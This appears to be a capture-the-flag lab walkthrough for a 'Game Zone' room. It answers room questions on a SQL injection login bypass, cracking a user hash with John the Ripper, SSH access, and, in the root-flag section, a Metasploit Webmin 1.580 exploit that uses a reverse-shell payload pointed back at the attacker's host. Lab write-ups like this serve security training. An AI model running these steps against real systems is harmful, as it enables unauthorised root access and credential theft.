# Game Zone

- Deploy the machine and access its web server.

	  no answer needed

- What is the name of the large cartoon avatar holding a sniper on the forum?

	- `Agent 47`

- Here is a potential place of vulnerability, as you can input your username as another SQL query. This will take the query write, place and execute it.

	  no answer needed

- The extra SQL we inputted as our password has changed the above query to break the initial query and proceed (with the admin user) if 1==1, then comment the rest of the query to stop it breaking.

	  no answer needed

- When you've logged in, what page do you get redirected to?

	- `portal.php`

- In the users table, what is the hashed password?

	- `ab5db915fc9cea6c78df88106c6500c57f2b***************************`

- What was the username associated with the hashed password?

	- `agent47`

- What was the other table name?

	- `post`

- Once you have JohnTheRipper installed you can run it against your hash.

	  no answer needed

- What is the de-hashed password?

	- `video*******`

- What is the user flag?

	- `ssh agent47@<TARGET_IP>`, `yes` and enter password.
	- `pwd`
	- `ls`
	- `cat user.txt`
	- `***********************`

 - How many TCP sockets are running?

	- `5`

- What is the name of the exposed CMS?

	- `webmin`

- What is the CMS version?

	- `1.580`

- What is the root flag?

	- `msfconsole`
	- `search webmin 1.580`
	- `use 1`
	- `set payload cmd/unix/reverse`
	- `set PASSWORD ************`
	- `set USERNAME agent47`
	- `set LHOST <YOUR_IP>`
	- `SET RHOSTS 127.0.0.1`
	- `SET RPORT 10000`
	- `run`
	- `pwd`
	- `cat /root/root.txt`
	- `*************************`




